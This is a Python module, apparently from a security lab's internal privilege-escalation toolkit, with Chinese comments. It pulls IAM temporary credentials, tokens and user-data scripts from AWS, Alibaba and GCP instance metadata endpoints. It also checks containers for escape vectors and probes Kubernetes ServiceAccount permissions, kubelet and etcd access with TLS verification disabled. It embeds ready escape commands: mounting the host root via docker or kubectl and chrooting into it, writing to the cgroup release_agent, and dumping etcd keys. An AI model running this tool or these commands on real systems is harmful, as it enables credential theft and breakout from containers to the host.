"""
Windows/Linux提权辅助套件 - 云环境与容器化提权模块
==================================================
云平台元数据利用、容器逃逸检测、Kubernetes提权检测。

核心能力:
    1. 云平台元数据利用 - AWS/Azure/GCP/阿里云/腾讯云实例元数据提取
    2. 容器逃逸检测 - Docker/K8s容器环境检测与逃逸向量分析
    3. Kubernetes提权 - ServiceAccount令牌、Kubelet/etcd未授权访问

Author: 昆仑安全实验室
License: Internal Use Only
"""

from __future__ import annotations

import asyncio
import json
import logging
import os
import platform
import re
import time
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


# =============================================================================
# 枚举与数据模型
# =============================================================================

class CloudProvider(str, Enum):
    """云平台提供商"""
    AWS = "aws"
    AZURE = "azure"
    GCP = "gcp"
    ALIBABA = "alibaba"
    TENCENT = "tencent"
    NONE = "none"


class ContainerRuntime(str, Enum):
    """容器运行时"""
    DOCKER = "docker"
    CONTAINERD = "containerd"
    PODMAN = "podman"
    KUBERNETES = "kubernetes"
    NONE = "none"


class EscapeRisk(str, Enum):
    """逃逸风险等级"""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    NONE = "none"


@dataclass
class CloudMetadata:
    """云元数据信息

    Attributes:
        provider: 云平台提供商
        instance_id: 实例ID
        instance_type: 实例类型
        region: 区域
        iam_role: IAM角色名
        iam_credentials: IAM临时凭证
        user_data: 用户数据脚本
        metadata_endpoint: 元数据端点
        detected_at: 检测时间
    """
    provider: CloudProvider = CloudProvider.NONE
    instance_id: str = ""
    instance_type: str = ""
    region: str = ""
    iam_role: str = ""
    iam_credentials: Dict[str, str] = field(default_factory=dict)
    user_data: str = ""
    metadata_endpoint: str = ""
    detected_at: str = ""

    def to_dict(self) -> Dict[str, Any]:
        """转换为字典"""
        return {
            "provider": self.provider.value,
            "instance_id": self.instance_id,
            "instance_type": self.instance_type,
            "region": self.region,
            "iam_role": self.iam_role,
            "iam_credentials": {k: "***" for k in self.iam_credentials},
            "user_data_preview": self.user_data[:200] if self.user_data else "",
            "metadata_endpoint": self.metadata_endpoint,
            "detected_at": self.detected_at,
        }


@dataclass
class ContainerInfo:
    """容器信息

    Attributes:
        is_container: 是否在容器内
        runtime: 容器运行时
        container_id: 容器ID
        is_privileged: 是否特权模式
        docker_socket_writable: Docker socket是否可写
        sensitive_mounts: 敏感挂载目录
        cgroup_escape_possible: cgroup逃逸是否可能
        kernel_version: 内核版本
        escape_vectors: 逃逸向量列表
    """
    is_container: bool = False
    runtime: ContainerRuntime = ContainerRuntime.NONE
    container_id: str = ""
    is_privileged: bool = False
    docker_socket_writable: bool = False
    sensitive_mounts: List[str] = field(default_factory=list)
    cgroup_escape_possible: bool = False
    kernel_version: str = ""
    escape_vectors: List[Dict[str, Any]] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        """转换为字典"""
        return {
            "is_container": self.is_container,
            "runtime": self.runtime.value,
            "container_id": self.container_id,
            "is_privileged": self.is_privileged,
            "docker_socket_writable": self.docker_socket_writable,
            "sensitive_mounts": self.sensitive_mounts,
            "cgroup_escape_possible": self.cgroup_escape_possible,
            "kernel_version": self.kernel_version,
            "escape_vectors": self.escape_vectors,
            "risk_level": self._calculate_risk(),
        }

    def _calculate_risk(self) -> str:
        """计算逃逸风险等级"""
        if self.is_privileged and self.docker_socket_writable:
            return EscapeRisk.CRITICAL.value
        if self.is_privileged or self.docker_socket_writable:
            return EscapeRisk.HIGH.value
        if self.cgroup_escape_possible or self.sensitive_mounts:
            return EscapeRisk.MEDIUM.value
        if self.is_container:
            return EscapeRisk.LOW.value
        return EscapeRisk.NONE.value


@dataclass
class K8sInfo:
    """Kubernetes信息

    Attributes:
        has_service_account: 是否有ServiceAccount令牌
        sa_token_path: SA令牌路径
        sa_namespace: SA命名空间
        sa_permissions: SA权限列表
        kubelet_unauthorized: Kubelet未授权访问
        kubelet_endpoint: Kubelet端点
        etcd_unauthorized: etcd未授权访问
        etcd_endpoint: etcd端点
        can_create_pods: 是否可以创建Pod
        can_mount_host_volumes: 是否可以挂载宿主机卷
        risk_vectors: 风险向量列表
    """
    has_service_account: bool = False
    sa_token_path: str = ""
    sa_namespace: str = ""
    sa_permissions: List[str] = field(default_factory=list)
    kubelet_unauthorized: bool = False
    kubelet_endpoint: str = ""
    etcd_unauthorized: bool = False
    etcd_endpoint: str = ""
    can_create_pods: bool = False
    can_mount_host_volumes: bool = False
    risk_vectors: List[Dict[str, Any]] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        """转换为字典"""
        return {
            "has_service_account": self.has_service_account,
            "sa_token_path": self.sa_token_path,
            "sa_namespace": self.sa_namespace,
            "sa_permissions": self.sa_permissions,
            "kubelet_unauthorized": self.kubelet_unauthorized,
            "kubelet_endpoint": self.kubelet_endpoint,
            "etcd_unauthorized": self.etcd_unauthorized,
            "etcd_endpoint": self.etcd_endpoint,
            "can_create_pods": self.can_create_pods,
            "can_mount_host_volumes": self.can_mount_host_volumes,
            "risk_vectors": self.risk_vectors,
        }


# =============================================================================
# 云平台元数据检测器
# =============================================================================

CLOUD_METADATA_ENDPOINTS = {
    CloudProvider.AWS: {
        "base": "http://169.254.169.254/latest/meta-data/",
        "iam": "iam/security-credentials/",
        "user_data": "user-data",
        "headers": {},
        "version_header": None,
    },
    CloudProvider.AZURE: {
        "base": "http://169.254.169.254/metadata/instance/compute/",
        "iam": "",
        "user_data": "",
        "headers": {"Metadata": "true"},
        "version_header": "2021-02-01",
    },
    CloudProvider.GCP: {
        "base": "http://metadata.google.internal/computeMetadata/v1/instance/",
        "iam": "service-accounts/default/token",
        "user_data": "attributes/startup-script",
        "headers": {"Metadata-Flavor": "Google"},
        "version_header": None,
    },
    CloudProvider.ALIBABA: {
        "base": "http://100.100.100.200/latest/meta-data/",
        "iam": "ram/security-credentials/",
        "user_data": "user-data",
        "headers": {},
        "version_header": None,
    },
    CloudProvider.TENCENT: {
        "base": "http://metadata.tencentyun.com/latest/meta-data/",
        "iam": "cam/security-credentials/",
        "user_data": "user-data",
        "headers": {},
        "version_header": None,
    },
}


class CloudMetadataDetector:
    """云平台元数据检测器

    检测当前环境是否为云平台实例，提取元数据信息。

    Attributes:
        _timeout: 请求超时时间
    """

    def __init__(self, timeout: int = 5) -> None:
        """初始化云元数据检测器

        Args:
            timeout: 请求超时时间（秒）
        """
        self._timeout = timeout

    async def detect(self) -> CloudMetadata:
        """检测云环境元数据

        Returns:
            云元数据信息
        """
        metadata = CloudMetadata(detected_at=datetime.now().isoformat())

        for provider in CloudProvider:
            if provider == CloudProvider.NONE:
                continue

            try:
                endpoint_info = CLOUD_METADATA_ENDPOINTS[provider]
                is_cloud = await self._check_cloud_provider(
                    provider, endpoint_info,
                )

                if is_cloud:
                    metadata.provider = provider
                    metadata.metadata_endpoint = endpoint_info["base"]

                    await self._fetch_instance_metadata(
                        metadata, provider, endpoint_info,
                    )
                    await self._fetch_iam_credentials(
                        metadata, provider, endpoint_info,
                    )
                    await self._fetch_user_data(
                        metadata, provider, endpoint_info,
                    )

                    break

            except Exception as e:
                logger.debug(f"检测 {provider.value} 失败: {e}")
                continue

        return metadata

    async def _check_cloud_provider(
        self,
        provider: CloudProvider,
        endpoint_info: Dict[str, Any],
    ) -> bool:
        """检查是否为指定云平台

        Args:
            provider: 云平台提供商
            endpoint_info: 端点信息

        Returns:
            是否匹配
        """
        try:
            url = endpoint_info["base"]
            headers = dict(endpoint_info.get("headers", {}))

            import urllib.request
            req = urllib.request.Request(url, headers=headers)

            with urllib.request.urlopen(req, timeout=self._timeout) as resp:
                return resp.status == 200

        except Exception:
            return False

    async def _fetch_instance_metadata(
        self,
        metadata: CloudMetadata,
        provider: CloudProvider,
        endpoint_info: Dict[str, Any],
    ) -> None:
        """获取实例元数据

        Args:
            metadata: 元数据对象
            provider: 云平台提供商
            endpoint_info: 端点信息
        """
        try:
            import urllib.request

            base = endpoint_info["base"]
            headers = dict(endpoint_info.get("headers", {}))

            if provider == CloudProvider.AWS:
                metadata.instance_id = await self._fetch_url(
                    f"{base}instance-id", headers,
                )
                metadata.instance_type = await self._fetch_url(
                    f"{base}instance-type", headers,
                )
                metadata.region = await self._fetch_url(
                    f"{base}placement/region", headers,
                )

            elif provider == CloudProvider.AZURE:
                url = f"{base}?api-version={endpoint_info.get('version_header', '2021-02-01')}"
                resp = await self._fetch_url(url, headers)
                if resp:
                    data = json.loads(resp)
                    metadata.instance_id = data.get("vmId", "")
                    metadata.instance_type = data.get("vmSize", "")
                    metadata.region = data.get("location", "")

            elif provider == CloudProvider.GCP:
                metadata.instance_id = await self._fetch_url(
                    f"{base}id", headers,
                )
                metadata.instance_type = await self._fetch_url(
                    f"{base}machine-type", headers,
                )
                zone = await self._fetch_url(f"{base}zone", headers)
                if zone:
                    metadata.region = zone.split("/")[-1].replace("-zone", "")

        except Exception as e:
            logger.debug(f"获取实例元数据失败: {e}")

    async def _fetch_iam_credentials(
        self,
        metadata: CloudMetadata,
        provider: CloudProvider,
        endpoint_info: Dict[str, Any],
    ) -> None:
        """获取IAM凭证

        Args:
            metadata: 元数据对象
            provider: 云平台提供商
            endpoint_info: 端点信息
        """
        try:
            import urllib.request

            base = endpoint_info["base"]
            headers = dict(endpoint_info.get("headers", {}))
            iam_path = endpoint_info.get("iam", "")

            if not iam_path:
                return

            if provider == CloudProvider.AWS:
                role_name = await self._fetch_url(
                    f"{base}{iam_path}", headers,
                )
                if role_name:
                    metadata.iam_role = role_name.strip()
                    cred_url = f"{base}{iam_path}{role_name.strip()}"
                    creds = await self._fetch_url(cred_url, headers)
                    if creds:
                        metadata.iam_credentials = json.loads(creds)

            elif provider == CloudProvider.ALIBABA:
                role_name = await self._fetch_url(
                    f"{base}{iam_path}", headers,
                )
                if role_name:
                    metadata.iam_role = role_name.strip()
                    cred_url = f"{base}{iam_path}{role_name.strip()}"
                    creds = await self._fetch_url(cred_url, headers)
                    if creds:
                        metadata.iam_credentials = json.loads(creds)

            elif provider == CloudProvider.GCP:
                token = await self._fetch_url(
                    f"{base}{iam_path}", headers,
                )
                if token:
                    metadata.iam_credentials = {"access_token": token.strip()}

        except Exception as e:
            logger.debug(f"获取IAM凭证失败: {e}")

    async def _fetch_user_data(
        self,
        metadata: CloudMetadata,
        provider: CloudProvider,
        endpoint_info: Dict[str, Any],
    ) -> None:
        """获取用户数据

        Args:
            metadata: 元数据对象
            provider: 云平台提供商
            endpoint_info: 端点信息
        """
        try:
            import urllib.request

            base = endpoint_info["base"]
            headers = dict(endpoint_info.get("headers", {}))
            user_data_path = endpoint_info.get("user_data", "")

            if not user_data_path:
                return

            url = f"{base}{user_data_path}"
            metadata.user_data = await self._fetch_url(url, headers)

        except Exception as e:
            logger.debug(f"获取用户数据失败: {e}")

    async def _fetch_url(
        self, url: str, headers: Dict[str, str],
    ) -> str:
        """获取URL内容

        Args:
            url: URL
            headers: 请求头

        Returns:
            响应内容
        """
        try:
            import urllib.request

            req = urllib.request.Request(url, headers=headers)
            with urllib.request.urlopen(req, timeout=self._timeout) as resp:
                return resp.read().decode("utf-8", errors="replace")
        except Exception:
            return ""


# =============================================================================
# 容器逃逸检测器
# =============================================================================

CONTAINER_ESCAPE_CVES = {
    "CVE-2022-0492": {
        "description": "cgroups release_agent逃逸",
        "affected_kernels": ["5.8", "5.9", "5.10", "5.11", "5.12", "5.13", "5.14", "5.15"],
        "check_method": "cgroup_v1_writable",
    },
    "CVE-2019-5736": {
        "description": "runc容器逃逸",
        "affected_runc": ["< 1.0-rc7"],
        "check_method": "runc_version",
    },
    "CVE-2021-30465": {
        "description": "runc mount逃逸",
        "affected_runc": ["< 1.0.0-rc95"],
        "check_method": "runc_version",
    },
    "CVE-2024-21626": {
        "description": "runc fd泄露逃逸",
        "affected_runc": ["< 1.1.12"],
        "check_method": "runc_version",
    },
}


class ContainerEscapeDetector:
    """容器逃逸检测器

    检测当前是否在容器内，分析逃逸向量。

    Attributes:
        _escape_cves: 已知容器逃逸CVE列表
    """

    def __init__(self) -> None:
        """初始化容器逃逸检测器"""
        self._escape_cves = CONTAINER_ESCAPE_CVES

    async def detect(self) -> ContainerInfo:
        """检测容器环境与逃逸向量

        Returns:
            容器信息
        """
        info = ContainerInfo()

        info.is_container = await self._check_container()
        if not info.is_container:
            return info

        info.runtime = await self._detect_runtime()
        info.container_id = await self._get_container_id()
        info.kernel_version = await self._get_kernel_version()

        info.is_privileged = await self._check_privileged_mode()
        info.docker_socket_writable = await self._check_docker_socket()
        info.sensitive_mounts = await self._check_sensitive_mounts()
        info.cgroup_escape_possible = await self._check_cgroup_escape()

        info.escape_vectors = await self._analyze_escape_vectors(info)

        return info

    async def _check_container(self) -> bool:
        """检查是否在容器内

        Returns:
            是否在容器内
        """
        checks = [
            os.path.exists("/.dockerenv"),
            os.path.exists("/run/.containerenv"),
            await self._check_cgroup_container(),
        ]
        return any(checks)

    async def _check_cgroup_container(self) -> bool:
        """检查cgroup容器特征

        Returns:
            是否有容器特征
        """
        try:
            for cgroup_file in ["/proc/1/cgroup", "/proc/self/cgroup"]:
                if os.path.exists(cgroup_file):
                    with open(cgroup_file, "r") as f:
                        content = f.read()
                        if any(
                            marker in content
                            for marker in ["docker", "containerd", "kubepods", "lxc"]
                        ):
                            return True
        except Exception:
            pass
        return False

    async def _detect_runtime(self) -> ContainerRuntime:
        """检测容器运行时

        Returns:
            容器运行时
        """
        if os.path.exists("/.dockerenv"):
            return ContainerRuntime.DOCKER

        try:
            for cgroup_file in ["/proc/1/cgroup", "/proc/self/cgroup"]:
                if os.path.exists(cgroup_file):
                    with open(cgroup_file, "r") as f:
                        content = f.read()
                        if "kubepods" in content:
                            return ContainerRuntime.KUBERNETES
                        if "containerd" in content:
                            return ContainerRuntime.CONTAINERD
                        if "lxc" in content:
                            return ContainerRuntime.PODMAN
        except Exception:
            pass

        return ContainerRuntime.DOCKER

    async def _get_container_id(self) -> str:
        """获取容器ID

        Returns:
            容器ID
        """
        try:
            for cgroup_file in ["/proc/1/cgroup", "/proc/self/cgroup"]:
                if os.path.exists(cgroup_file):
                    with open(cgroup_file, "r") as f:
                        content = f.read()
                        match = re.search(
                            r"[0-9a-f]{64}", content,
                        )
                        if match:
                            return match.group()[:12]
        except Exception:
            pass
        return ""

    async def _get_kernel_version(self) -> str:
        """获取内核版本

        Returns:
            内核版本
        """
        try:
            proc = await asyncio.create_subprocess_shell(
                "uname -r",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            return stdout.decode("utf-8", errors="replace").strip()
        except Exception:
            return ""

    async def _check_privileged_mode(self) -> bool:
        """检查是否特权模式

        Returns:
            是否特权模式
        """
        try:
            for cap_file in [
                "/proc/1/status",
                "/proc/self/status",
            ]:
                if os.path.exists(cap_file):
                    with open(cap_file, "r") as f:
                        content = f.read()
                        if "CapEff" in content:
                            for line in content.split("\n"):
                                if line.startswith("CapEff:"):
                                    cap_value = line.split(":")[1].strip()
                                    return cap_value == "0000003fffffffff"
        except Exception:
            pass
        return False

    async def _check_docker_socket(self) -> bool:
        """检查Docker socket是否可写

        Returns:
            是否可写
        """
        socket_path = "/var/run/docker.sock"
        if not os.path.exists(socket_path):
            return False

        return os.access(socket_path, os.W_OK)

    async def _check_sensitive_mounts(self) -> List[str]:
        """检查敏感挂载目录

        Returns:
            可写的敏感挂载目录列表
        """
        sensitive_paths = [
            "/proc", "/sys", "/etc", "/root", "/var/run/docker.sock",
            "/host", "/hostroot", "/mnt",
        ]
        writable = []

        for path in sensitive_paths:
            if os.path.exists(path):
                if os.access(path, os.W_OK):
                    writable.append(path)

        return writable

    async def _check_cgroup_escape(self) -> bool:
        """检查cgroup逃逸可能性

        Returns:
            是否可能逃逸
        """
        try:
            release_agent = "/sys/fs/cgroup/release_agent"
            if os.path.exists(release_agent):
                return os.access(release_agent, os.W_OK)

            notify_on_release = "/sys/fs/cgroup/cgroup.notify_on_release"
            if os.path.exists(notify_on_release):
                return os.access(notify_on_release, os.W_OK)

        except Exception:
            pass

        return False

    async def _analyze_escape_vectors(self, info: ContainerInfo) -> List[Dict[str, Any]]:
        """分析逃逸向量

        Args:
            info: 容器信息

        Returns:
            逃逸向量列表
        """
        vectors = []

        if info.is_privileged:
            vectors.append({
                "vector": "privileged_container",
                "description": "特权容器，可直接访问宿主机设备",
                "risk": EscapeRisk.CRITICAL.value,
                "method": "mount /dev/sda1 && chroot",
            })

        if info.docker_socket_writable:
            vectors.append({
                "vector": "docker_socket",
                "description": "Docker socket可写，可创建特权容器",
                "risk": EscapeRisk.CRITICAL.value,
                "method": "docker run -v /:/host -it alpine chroot /host",
            })

        if info.cgroup_escape_possible:
            vectors.append({
                "vector": "cgroup_release_agent",
                "description": "cgroup release_agent可写，CVE-2022-0492",
                "risk": EscapeRisk.HIGH.value,
                "method": "echo '/tmp/shell.sh' > /sys/fs/cgroup/release_agent",
            })

        for mount in info.sensitive_mounts:
            vectors.append({
                "vector": f"sensitive_mount_{mount}",
                "description": f"敏感目录 {mount} 可写",
                "risk": EscapeRisk.HIGH.value,
                "method": f"直接修改 {mount} 下的文件",
            })

        kernel_version = info.kernel_version.split("-")[0]
        for cve_id, cve_info in self._escape_cves.items():
            for affected in cve_info.get("affected_kernels", []):
                if affected in kernel_version:
                    vectors.append({
                        "vector": cve_id,
                        "description": cve_info["description"],
                        "risk": EscapeRisk.HIGH.value,
                        "method": f"利用 {cve_id} 逃逸",
                    })

        return vectors


# =============================================================================
# Kubernetes提权检测器
# =============================================================================

class K8sPrivescDetector:
    """Kubernetes提权检测器

    检查ServiceAccount权限、Kubelet/etcd未授权访问。

    Attributes:
        _sa_token_path: SA令牌路径
        _timeout: 请求超时
    """

    def __init__(self, timeout: int = 5) -> None:
        """初始化K8s提权检测器

        Args:
            timeout: 请求超时（秒）
        """
        self._sa_token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
        self._timeout = timeout

    async def detect(self) -> K8sInfo:
        """检测Kubernetes提权向量

        Returns:
            K8s信息
        """
        info = K8sInfo()

        info.has_service_account = os.path.exists(self._sa_token_path)
        if info.has_service_account:
            info.sa_token_path = self._sa_token_path
            info.sa_namespace = await self._get_sa_namespace()
            info.sa_permissions = await self._enumerate_sa_permissions()
            info.can_create_pods = "create" in info.sa_permissions and "pods" in str(info.sa_permissions)
            info.can_mount_host_volumes = "hostPath" in str(info.sa_permissions)

        await self._check_kubelet(info)
        await self._check_etcd(info)

        info.risk_vectors = self._analyze_k8s_risks(info)

        return info

    async def _get_sa_namespace(self) -> str:
        """获取SA命名空间

        Returns:
            命名空间
        """
        try:
            ns_path = "/var/run/secrets/kubernetes.io/serviceaccount/namespace"
            if os.path.exists(ns_path):
                with open(ns_path, "r") as f:
                    return f.read().strip()
        except Exception:
            pass
        return "default"

    async def _enumerate_sa_permissions(self) -> List[str]:
        """枚举SA权限

        Returns:
            权限列表
        """
        permissions = []

        try:
            with open(self._sa_token_path, "r") as f:
                token = f.read().strip()

            api_server = os.environ.get("KUBERNETES_SERVICE_HOST", "kubernetes.default.svc")
            api_port = os.environ.get("KUBERNETES_SERVICE_PORT", "443")

            import urllib.request
            import ssl

            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            url = f"https://{api_server}:{api_port}/apis/authorization.k8s.io/v1/selfsubjectaccessreviews"

            test_resources = [
                ("pods", "create"),
                ("pods", "list"),
                ("secrets", "get"),
                ("secrets", "list"),
                ("serviceaccounts", "impersonate"),
                ("clusterroles", "bind"),
                ("nodes", "proxy"),
            ]

            for resource, verb in test_resources:
                payload = json.dumps({
                    "spec": {
                        "resourceAttributes": {
                            "verb": verb,
                            "resource": resource,
                        }
                    }
                }).encode("utf-8")

                req = urllib.request.Request(
                    url,
                    data=payload,
                    headers={
                        "Authorization": f"Bearer {token}",
                        "Content-Type": "application/json",
                    },
                    method="POST",
                )

                try:
                    with urllib.request.urlopen(req, timeout=self._timeout, context=ctx) as resp:
                        data = json.loads(resp.read().decode("utf-8"))
                        if data.get("status", {}).get("allowed", False):
                            permissions.append(f"{verb}:{resource}")
                except Exception:
                    pass

        except Exception as e:
            logger.debug(f"枚举SA权限失败: {e}")

        return permissions

    async def _check_kubelet(self, info: K8sInfo) -> None:
        """检查Kubelet未授权访问

        Args:
            info: K8s信息
        """
        kubelet_ports = [10250, 10255]

        for port in kubelet_ports:
            try:
                import urllib.request

                url = f"https://localhost:{port}/pods"
                req = urllib.request.Request(url)

                with urllib.request.urlopen(req, timeout=self._timeout) as resp:
                    if resp.status == 200:
                        info.kubelet_unauthorized = True
                        info.kubelet_endpoint = url
                        break

            except Exception:
                continue

    async def _check_etcd(self, info: K8sInfo) -> None:
        """检查etcd未授权访问

        Args:
            info: K8s信息
        """
        etcd_ports = [2379, 2380]

        for port in etcd_ports:
            try:
                import urllib.request

                url = f"http://localhost:{port}/version"
                req = urllib.request.Request(url)

                with urllib.request.urlopen(req, timeout=self._timeout) as resp:
                    if resp.status == 200:
                        info.etcd_unauthorized = True
                        info.etcd_endpoint = f"http://localhost:{port}"
                        break

            except Exception:
                continue

    def _analyze_k8s_risks(self, info: K8sInfo) -> List[Dict[str, Any]]:
        """分析K8s风险向量

        Args:
            info: K8s信息

        Returns:
            风险向量列表
        """
        vectors = []

        if info.can_create_pods:
            vectors.append({
                "vector": "create_pods",
                "description": "可创建Pod，可挂载宿主机卷提权",
                "risk": EscapeRisk.CRITICAL.value,
                "method": "kubectl run -v /:/host --image=alpine chroot /host",
            })

        if info.kubelet_unauthorized:
            vectors.append({
                "vector": "kubelet_unauthorized",
                "description": "Kubelet未授权访问，可执行容器命令",
                "risk": EscapeRisk.CRITICAL.value,
                "method": f"curl -sk {info.kubelet_endpoint}/runningpods/",
            })

        if info.etcd_unauthorized:
            vectors.append({
                "vector": "etcd_unauthorized",
                "description": "etcd未授权访问，可获取集群所有凭证",
                "risk": EscapeRisk.CRITICAL.value,
                "method": f"etcdctl --endpoints={info.etcd_endpoint} get / --prefix --keys-only",
            })

        if "secrets:get" in info.sa_permissions or "secrets:list" in info.sa_permissions:
            vectors.append({
                "vector": "secrets_access",
                "description": "可读取K8s Secrets，可能包含敏感凭证",
                "risk": EscapeRisk.HIGH.value,
                "method": "kubectl get secrets -o yaml",
            })

        return vectors


# =============================================================================
# 主云环境提权检测器
# =============================================================================

class CloudPrivescDetector:
    """云环境与容器化提权检测器

    整合云平台元数据、容器逃逸、Kubernetes提权检测。

    Attributes:
        _cloud_detector: 云元数据检测器
        _container_detector: 容器逃逸检测器
        _k8s_detector: K8s提权检测器
    """

    def __init__(self, timeout: int = 5) -> None:
        """初始化云环境提权检测器

        Args:
            timeout: 请求超时（秒）
        """
        self._cloud_detector = CloudMetadataDetector(timeout)
        self._container_detector = ContainerEscapeDetector()
        self._k8s_detector = K8sPrivescDetector(timeout)

    async def full_scan(self) -> Dict[str, Any]:
        """完整扫描云环境提权向量

        Returns:
            扫描结果
        """
        cloud_metadata = await self._cloud_detector.detect()
        container_info = await self._container_detector.detect()
        k8s_info = await self._k8s_detector.detect()

        return {
            "cloud_metadata": cloud_metadata.to_dict(),
            "container_info": container_info.to_dict(),
            "k8s_info": k8s_info.to_dict(),
            "summary": self._generate_summary(
                cloud_metadata, container_info, k8s_info,
            ),
            "scanned_at": datetime.now().isoformat(),
        }

    def _generate_summary(
        self,
        cloud: CloudMetadata,
        container: ContainerInfo,
        k8s: K8sInfo,
    ) -> Dict[str, Any]:
        """生成扫描摘要

        Args:
            cloud: 云元数据
            container: 容器信息
            k8s: K8s信息

        Returns:
            扫描摘要
        """
        critical_findings = []
        high_findings = []

        if cloud.provider != CloudProvider.NONE:
            if cloud.iam_credentials:
                critical_findings.append(
                    f"发现{cloud.provider.value} IAM临时凭证",
                )
            if cloud.user_data:
                high_findings.append("发现用户数据脚本，可能包含凭据")

        if container.is_container:
            if container.is_privileged:
                critical_findings.append("特权容器，可直接逃逸到宿主机")
            if container.docker_socket_writable:
                critical_findings.append("Docker socket可写，可创建特权容器")
            if container.cgroup_escape_possible:
                high_findings.append("cgroup逃逸向量可用")

        if k8s.has_service_account:
            if k8s.can_create_pods:
                critical_findings.append("可创建Pod，可挂载宿主机卷提权")
            if k8s.kubelet_unauthorized:
                critical_findings.append("Kubelet未授权访问")
            if k8s.etcd_unauthorized:
                critical_findings.append("etcd未授权访问")

        return {
            "is_cloud": cloud.provider != CloudProvider.NONE,
            "is_container": container.is_container,
            "is_kubernetes": k8s.has_service_account,
            "critical_findings": critical_findings,
            "high_findings": high_findings,
            "total_critical": len(critical_findings),
            "total_high": len(high_findings),
        }


# =============================================================================
# 全局单例
# =============================================================================

_cloud_privesc_detector: Optional[CloudPrivescDetector] = None


def get_cloud_privesc_detector() -> CloudPrivescDetector:
    """获取云环境提权检测器全局单例

    Returns:
        CloudPrivescDetector 实例
    """
    global _cloud_privesc_detector
    if _cloud_privesc_detector is None:
        _cloud_privesc_detector = CloudPrivescDetector()
    return _cloud_privesc_detector


__all__ = [
    "CloudPrivescDetector",
    "CloudMetadataDetector",
    "ContainerEscapeDetector",
    "K8sPrivescDetector",
    "CloudMetadata",
    "ContainerInfo",
    "K8sInfo",
    "CloudProvider",
    "ContainerRuntime",
    "EscapeRisk",
    "CLOUD_METADATA_ENDPOINTS",
    "CONTAINER_ESCAPE_CVES",
    "get_cloud_privesc_detector",
]
